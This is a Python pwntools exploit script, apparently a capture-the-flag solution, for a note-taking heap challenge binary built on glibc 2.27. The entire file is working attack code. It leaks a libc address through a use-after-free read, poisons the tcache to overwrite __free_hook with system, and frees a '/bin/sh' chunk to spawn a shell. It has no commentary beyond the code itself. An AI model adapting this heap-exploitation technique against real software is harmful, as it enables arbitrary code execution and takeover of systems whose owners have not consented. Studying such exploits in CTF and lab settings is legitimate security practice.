#!/usr/bin/env python3

from pwn import *

exe = ELF("./SimpleNotes_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

p = process()
gdb.attach(p)

def add_note(id,size,note):
    p.sendlineafter(b'>> ',b'1')
    p.sendlineafter(b'Enter the id of note: ',str(id).encode())
    p.sendlineafter(b'Enter the size of note: ',str(size).encode())
    p.sendafter(b'note: ',note)
def edit_note(id,size,note):
    p.sendlineafter(b'>> ',b'2')
    p.sendlineafter(b'Enter the id of note: ',str(id).encode())
    p.sendlineafter(b'Enter the size of note: ',str(size).encode())
    p.sendafter(b'Enter the note: ',note)
def delete_note(id):
    p.sendlineafter(b'>> ',b'3')
    p.sendlineafter(b'id of note: ',str(id).encode())
def read_note(id):
    p.sendlineafter(b'>> ',b'4')
    p.sendlineafter(b'Enter the id of note: ',str(id).encode())
    

add_note(0,0x500,b'aaa')
add_note(1,0x20,b'ccc')
add_note(2,0x20,b'ddd')
input()
delete_note(0)
read_note(0)
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc.address = leak - 0x3ebca0
print("leak: ",hex(leak))
print("lb: ",hex(libc.address))
delete_note(1)
delete_note(2)
edit_note(2,0x20,p64(libc.sym.__free_hook))

add_note(3,0x20,b'/bin/sh\x00')
add_note(4,0x20,p64(libc.sym.system))

delete_note(3)

p.interactive()
